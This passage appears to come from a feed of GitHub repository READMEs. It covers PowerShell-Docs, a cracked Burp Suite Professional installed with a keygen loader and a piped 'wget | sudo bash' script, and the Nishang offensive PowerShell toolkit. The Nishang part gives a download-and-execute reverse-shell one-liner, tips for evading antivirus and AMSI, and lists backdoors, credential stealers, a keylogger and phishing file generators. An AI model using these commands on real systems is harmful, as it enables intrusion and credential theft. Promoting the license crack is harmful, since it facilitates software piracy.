&lt;p&gt;This project has adopted the &lt;a href=&quot;https://raw.githubusercontent.com/MicrosoftDocs/PowerShell-Docs/main/CODE_OF_CONDUCT.md&quot;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;PowerShell Updatable Help (CabGen) CI Build Status&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://apidrop.visualstudio.com/Content%20CI/_build/latest?definitionId=5076&amp;amp;repoName=MicrosoftDocs%2FPowerShell-Docs&amp;amp;branchName=live&quot;&gt;&lt;img src=&quot;https://apidrop.visualstudio.com/Content%20CI/_apis/build/status/PROD/CabGen(PowerShell_Updatable_Help)/GitHub_MicrosoftDocs_PowerShell-Docs/6ff7e8c3-dfc6-3ebd-da5a-d5e2ff43de8f_cabgen_Publish-Updatable-Help?repoName=MicrosoftDocs%2FPowerShell-Docs&amp;amp;branchName=live&quot; alt=&quot;Build Status&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Repository Structure&lt;/h2&gt; 
&lt;p&gt;The following list describes the main folders in this repository.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;.devcontainer&lt;/code&gt; - configuration files for the VS Code Remote - Containers extension&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.github&lt;/code&gt; - contains configuration settings used by GitHub for this repository&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.vscode&lt;/code&gt; - contains configuration settings and recommended extensions for VS Code&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;assets&lt;/code&gt; - contains downloadable files linked in the documentation&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;redir&lt;/code&gt; - contain redirection mapping files&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;reference&lt;/code&gt; - contains the documentation published to &lt;a href=&quot;https://learn.microsoft.com/powershell/scripting/&quot;&gt;learn.microsoft.com&lt;/a&gt;. This includes both reference and conceptual content. 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;5.1&lt;/code&gt; - contains the cmdlet reference and about topics for PowerShell 5.1&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;7.4&lt;/code&gt; - contains the cmdlet reference and about topics for PowerShell 7.4&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;7.5&lt;/code&gt; - contains the cmdlet reference and about topics for PowerShell 7.5&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;7.6&lt;/code&gt; - contains the cmdlet reference and about topics for PowerShell 7.6&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;bread&lt;/code&gt; - contains the TOC used for breadcrumb navigation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;docs-conceptual&lt;/code&gt; - contains the conceptual articles that are published to the Docs site. In general, the folder structure mirrors the Table of Contents (TOC).&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;includes&lt;/code&gt; - contains markdown include files&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;mapping&lt;/code&gt; - contains the version mapping configuration used by the build system&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;media&lt;/code&gt; - contains image files used in documentation. There are media folders throughout the &lt;code&gt;docs-conceptual&lt;/code&gt; content. See the Contributor Guide for information on using images in documentation.&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;module&lt;/code&gt; - contains the markdown source for the Module Browser page&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;tests&lt;/code&gt; - contains the Pester tests used by the build system&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;tools&lt;/code&gt; - contains other tools used by the build system&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] The reference content (in the numbered folders) is used to create the webpages on the Docs site as well as the updateable help used by PowerShell. The articles in the &lt;code&gt;docs-conceptual&lt;/code&gt; folder are only published to the Docs website.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;We welcome public contributions into this repository via pull requests into the &lt;em&gt;main&lt;/em&gt; branch. Please note that before we can accept your pull request you must sign our &lt;a href=&quot;https://cla.microsoft.com/&quot;&gt;Contribution License Agreement&lt;/a&gt;. This is a one-time requirement.&lt;/p&gt; 
&lt;p&gt;For more information on contributing, read our &lt;a href=&quot;https://aka.ms/PSDocsContributor&quot;&gt;contributor&#39;s guide&lt;/a&gt;. The contributor&#39;s guide contains detailed information about how to contribute documentation, suggested tools, and style and formatting requirements. Please use the Issue and Pull Request templates to help keep documentation consistent across versions.&lt;/p&gt; 
&lt;h2&gt;Licenses&lt;/h2&gt; 
&lt;p&gt;There are two license files for this project. The &lt;a href=&quot;https://raw.githubusercontent.com/MicrosoftDocs/PowerShell-Docs/main/LICENSE-CODE.md&quot;&gt;MIT License&lt;/a&gt; applies to the code contained in this repo. The &lt;a href=&quot;https://raw.githubusercontent.com/MicrosoftDocs/PowerShell-Docs/main/LICENSE.md&quot;&gt;Creative Commons license&lt;/a&gt; applies to the documentation.&lt;/p&gt; 
&lt;!-- link references --&gt;</description>
    </item>
    
    <item>
      <title>xiv3r/Burpsuite-Professional</title>
      <link>https://github.com/xiv3r/Burpsuite-Professional</link>
      <description>&lt;p&gt;Latest Burpsuite Professional v2025.1.*&lt;/p&gt;&lt;hr&gt;&lt;p align=&quot;center&quot;&gt; &lt;img src=&quot;https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fxiv3r%2FBurpsuite-Professional&amp;amp;count_bg=%2379C83D&amp;amp;title_bg=%23555555&amp;amp;icon=&amp;amp;icon_color=%23E7E7E7&amp;amp;title=%F0%9F%91%81%EF%B8%8F+++%F0%9F%91%81%EF%B8%8F&amp;amp;edge_flat=false&quot;&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/user-attachments/assets/873ef98a-48e0-445b-b5dc-eb5959ad5b34&quot; alt=&quot;Screenshot_2024-09-19_17_45_09&quot;&gt;&lt;/p&gt; 
&lt;h1&gt;&lt;/h1&gt;
&lt;h1 align=&quot;center&quot;&gt; Burpsuite Professional v2024 latest &lt;/h1&gt; 
&lt;p align=&quot;center&quot;&gt; Burp Suite Professional is the web security tester&#39;s toolkit of choice. Use it to automate repetitive testing tasks - then dig deeper with its expert-designed manual and semi-automated security testing tools. Burp Suite Professional can help you to test for OWASP Top 10 vulnerabilities - as well as the very latest hacking techniques. Advanced manual and automated features empower users to find lurking vulnerabilities more quickly. Burp Suite is designed and used by the industry&#39;s best.&lt;/p&gt; 
&lt;h1 align=&quot;center&quot;&gt; &lt;p&gt;&lt;a href=&quot;https://portswigger.net/burp/pro&quot;&gt;Overview&lt;/a&gt;&lt;/p&gt; &lt;/h1&gt; 
&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt; 
&lt;h1 align=&quot;center&quot;&gt; Linux Installation &lt;/h1&gt; 
&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;h3&gt;Auto Install&lt;/h3&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;wget -qO- https://raw.githubusercontent.com/xiv3r/Burpsuite-Professional/main/install.sh | sudo bash
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;h3&gt;Run&lt;/h3&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;burpsuitepro
&lt;/code&gt;&lt;/pre&gt; 
&lt;details&gt;
 &lt;summary&gt; &lt;h3&gt;Update [Optional]&lt;/h3&gt; &lt;/summary&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;cd &amp;amp;&amp;amp; rm -rf Burpsuite-Professional &amp;amp;&amp;amp; wget -qO- https://raw.githubusercontent.com/xiv3r/Burpsuite-Professional/refs/heads/main/update.sh | sudo sh
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt;
 &lt;summary&gt; &lt;h3&gt;Java Version [ stable: openjdk-21-jre ]&lt;/h3&gt; &lt;/summary&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;sudo update-alternatives --config java
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;h3&gt;Setup Licenses&lt;/h3&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;p&gt;&lt;a href=&quot;https://github.com/xiv3r/Burpsuite-Professional/assets/117867334/c25831a4-68a2-44ee-b6dd-5ff18165f340&quot;&gt;https://github.com/xiv3r/Burpsuite-Professional/assets/117867334/c25831a4-68a2-44ee-b6dd-5ff18165f340&lt;/a&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;p&gt;Note: Copy the license from loader to the burpsuite &amp;gt; manual activation &amp;gt; copy burpsuite request key to loader request &amp;gt; copy response key to the burpsuite.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;h3&gt;Create a Launcher (xfce)&lt;/h3&gt; &lt;p&gt;right click the desktop -&amp;gt; create a launcher name it Burpsuite Professional, add command &lt;code&gt;burpsuitepro&lt;/code&gt; and select burpsuite community icon.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;img width=&quot;500&quot; height=&quot;500&quot; src=&quot;https://github.com/xiv3r/Burpsuite-Professional/raw/main/Launcher.jpg&quot;&gt; 
&lt;/div&gt; 
&lt;h1&gt;&lt;/h1&gt;
&lt;h1 align=&quot;center&quot;&gt; Windows Installation&lt;/h1&gt; 
&lt;br&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Make a &lt;code&gt;Burp&lt;/code&gt; directory name in &lt;code&gt;C Drive&lt;/code&gt; for faster access.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Download &lt;a href=&quot;https://codeload.github.com/xiv3r/Burpsuite-Professional/zip/refs/heads/main&quot;&gt;install.ps1&lt;/a&gt; and extract move the file inside to &lt;code&gt;C:\Burp&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Open &lt;code&gt;Powershell&lt;/code&gt; as administrator and execute below command to set Script Execution Policy.&lt;/p&gt; &lt;pre&gt;&lt;code&gt;Set-ExecutionPolicy -ExecutionPolicy bypass -Scope process
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Inside PowerShell go to &lt;code&gt;cd C:\Burp&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Now Execute &lt;code&gt;install.ps1&lt;/code&gt; file in Powershell to Complete Installation.&lt;/p&gt; &lt;pre&gt;&lt;code&gt;./install.ps1
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Change the icon of &lt;code&gt;Burp-Suite-Pro.vbs&lt;/code&gt; to the given icon&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Create a shortcut to Desktop. Right Click over &lt;code&gt;Burp-Suite-Pro.vbs&lt;/code&gt; Go to Shortcut tab, and below there is &lt;code&gt;Change Icon&lt;/code&gt; tab&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Click there and choose the &lt;code&gt;burp-suite.ico&lt;/code&gt; from &lt;code&gt;C:\Burp\&lt;/code&gt;&lt;/p&gt; 
  &lt;div align=&quot;center&quot;&gt; 
   &lt;img src=&quot;https://user-images.githubusercontent.com/29830064/230825172-16c9cfba-4bca-46a4-86df-b352a4330b12.png&quot;&gt; 
  &lt;/div&gt;&lt;/li&gt; 
&lt;/ul&gt;  
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;For Start Menu Entry, copy &lt;code&gt;Burp-Suite-Pro.vbs&lt;/code&gt; file to&lt;/p&gt; &lt;pre&gt;&lt;code&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1 align=&quot;center&quot;&gt; 
 &lt;details&gt;
  &lt;summary&gt;Credits 👇&lt;/summary&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Loader.jar 👉 &lt;a href=&quot;https://github.com/h3110w0r1d-y/BurpLoaderKeygen&quot;&gt;h3110w0r1d-y&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;Modified 👉 &lt;a href=&quot;https://github.com/cyb3rzest/Burp-Suite-Pro&quot;&gt;cyb3rzest&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; 
 &lt;/details&gt; &lt;/h1&gt;</description>
    </item>
    
    <item>
      <title>samratashok/nishang</title>
      <link>https://github.com/samratashok/nishang</link>
      <description>&lt;p&gt;Nishang - Offensive PowerShell for red team, penetration testing and offensive security.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Nishang&lt;/h1&gt; 
&lt;h3&gt;Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.&lt;/h3&gt; 
&lt;p&gt;By &lt;a href=&quot;https://twitter.com/nikhil_mitt&quot;&gt;Nikhil Mittal&lt;/a&gt; Founder of &lt;a href=&quot;https://www.alteredsecurity.com/&quot;&gt;Altered Security - Hands-on red team and enterprise security training!&lt;/a&gt;&lt;/p&gt; 
&lt;h4&gt;Usage&lt;/h4&gt; 
&lt;p&gt;Import all the scripts in the current PowerShell session (PowerShell v3 onwards).&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; Import-Module .\nishang.psm1
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Use the individual scripts with dot sourcing.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . C:\nishang\Gather\Get-Information.ps1

PS C:\nishang&amp;gt; Get-Information
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To get help about any script or function, use:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; Get-Help [scriptname] -full
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.&lt;/p&gt; 
&lt;p&gt;For example, to see the help about Get-WLAN-Keys.ps1, use&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . C:\nishang\Get-WLAN-Keys.ps1

PS C:\nishang&amp;gt; Get-Help Get-WLAN-Keys -Full
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Anti Virus&lt;/h4&gt; 
&lt;p&gt;Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:&lt;/p&gt; 
&lt;p&gt;Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://&amp;lt;yourwebserver&amp;gt;/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Method 2. Use the &lt;code&gt;-encodedcommand&lt;/code&gt; (or &lt;code&gt;-e&lt;/code&gt;) parameter of PowerShell All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) &lt;code&gt;&quot;Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]&quot;&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;Encode the scrript using Invoke-Encode from Nishang:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . \nishang\Utility\Invoke-Encode

PS C:\nishang&amp;gt; Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Encoded data written to .\encoded.txt&lt;/p&gt; 
&lt;p&gt;Encoded command written to .\encodedcommand.txt&lt;/p&gt; 
&lt;p&gt;From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:\Users\target&amp;gt; powershell -e [encodedscript]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If the scripts still get detected changing the function and parameter names and removing the help content will help.&lt;/p&gt; 
&lt;p&gt;In case Windows 10&#39;s AMSI is still blocking script execution, see this blog: &lt;a href=&quot;http://www.labofapenetrationtester.com/2016/09/amsi.html&quot;&gt;http://www.labofapenetrationtester.com/2016/09/amsi.html&lt;/a&gt;&lt;/p&gt; 
&lt;h4&gt;Scripts&lt;/h4&gt; 
&lt;p&gt;Nishang currently contains the following scripts and payloads.&lt;/p&gt; 
&lt;h4&gt;ActiveDirectory&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/ActiveDirectory/Set-DCShadowPermissions.ps1&quot;&gt;Set-DCShadowPermissions&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Modify AD objects to provide minimal permissions required for DCShadow.&lt;/p&gt; 
&lt;h4&gt;Antak - the Webshell&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/tree/master/Antak-WebShell&quot;&gt;Antak&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell.&lt;/p&gt; 
&lt;h4&gt;Backdoors&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/HTTP-Backdoor.ps1&quot;&gt;HTTP-Backdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/DNS_TXT_Pwnage.ps1&quot;&gt;DNS_TXT_Pwnage&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Execute-OnTime.ps1&quot;&gt;Execute-OnTime&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can execute PowerShell scripts at a given time on a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Gupt-Backdoor.ps1&quot;&gt;Gupt-Backdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Add-ScrnSaveBackdoor.ps1&quot;&gt;Add-ScrnSaveBackdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can use Windows screen saver for remote command and script execution.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Invoke-ADSBackdoor.ps1&quot;&gt;Invoke-ADSBackdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can use alternate data streams and Windows Registry to achieve persistence.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Add-RegBackdoor.ps1&quot;&gt;Add-RegBackdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U).&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Set-RemoteWMI.ps1&quot;&gt;Set-RemoteWMI&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Set-RemotePSRemoting.ps1&quot;&gt;Set-RemotePSRemoting&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Modify permissions of PowerShell remoting to allow access to a non-admin user.&lt;/p&gt; 
&lt;h4&gt;Bypass&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Bypass/Invoke-AmsiBypass.ps1&quot;&gt;Invoke-AmsiBypass&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Implementation of publicly known methods to bypass/avoid AMSI.&lt;/p&gt; 
&lt;h4&gt;Client&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-CHM.ps1&quot;&gt;Out-CHM&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create infected CHM files which can execute PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Word.ps1&quot;&gt;Out-Word&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create Word files and infect existing ones to run PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Excel.ps1&quot;&gt;Out-Excel&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create Excel files and infect existing ones to run PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-HTA.ps1&quot;&gt;Out-HTA&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create a HTA file which can be deployed on a web server and used in phishing campaigns.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Java.ps1&quot;&gt;Out-Java&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create signed JAR files which can be used with applets for script and command execution.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Shortcut.ps1&quot;&gt;Out-Shortcut&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create shortcut files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-WebQuery.ps1&quot;&gt;Out-WebQuery&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create IQY files for phishing credentials and SMB hashes.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-JS.ps1&quot;&gt;Out-JS&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create JS files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-SCT.ps1&quot;&gt;Out-SCT&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create SCT files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-SCF.ps1&quot;&gt;Out-SCF&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create a SCF file which can be used for capturing NTLM hash challenges.&lt;/p&gt; 
&lt;h4&gt;Escalation&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Enable-DuplicateToken.ps1&quot;&gt;Enable-DuplicateToken&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;When SYSTEM privileges are required.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Remove-Update.ps1&quot;&gt;Remove-Update&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Introduce vulnerabilities by removing patches.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Invoke-PsUACme.ps1&quot;&gt;Invoke-PsUACme&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Bypass UAC.&lt;/p&gt; 
&lt;h4&gt;Execution&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Download-Execute-PS.ps1&quot;&gt;Download-Execute-PS&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Download and execute a PowerShell script in memory.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Download_Execute.ps1&quot;&gt;Download_Execute&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Download an executable in text format, convert it to an executable, and execute.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Execute-Command-MSSQL.ps1&quot;&gt;Execute-Command-MSSQL&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Execute-DNSTXT-Code.ps1&quot;&gt;Execute-DNSTXT-Code&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Execute shellcode in memory using DNS TXT queries.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Out-RundllCommand.ps1&quot;&gt;Out-RundllCommand&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe.&lt;/p&gt; 
&lt;h4&gt;Gather&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Check-VM.ps1&quot;&gt;Check-VM&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Check for a virtual machine.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Copy-VSS.ps1&quot;&gt;Copy-VSS&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Copy the SAM file using Volume Shadow Copy Service.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Credentials.ps1&quot;&gt;Invoke-CredentialsPhish&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Trick a user into giving credentials in plain text.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/FireBuster.ps1&quot;&gt;FireBuster&lt;/a&gt; &lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/FireListener.ps1&quot;&gt;FireListener&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A pair of scripts for egress testing&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-Information.ps1&quot;&gt;Get-Information&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get juicy information from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-LSASecret.ps1&quot;&gt;Get-LSASecret&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get LSA Secret from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-PassHashes.ps1&quot;&gt;Get-PassHashes&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get password hashes from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-WLAN-Keys.ps1&quot;&gt;Get-WLAN-Keys&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get WLAN keys in plain text from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Keylogger.ps1&quot;&gt;Keylogger&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Log keystrokes from a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1&quot;&gt;Invoke-MimikatzWdigestDowngrade&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Dump user passwords in plain on Windows 8.1 and Server 2012&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-PassHints.ps1&quot;&gt;Get-PassHints&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Get password hints of Windows users from a target.&lt;/p&gt; 
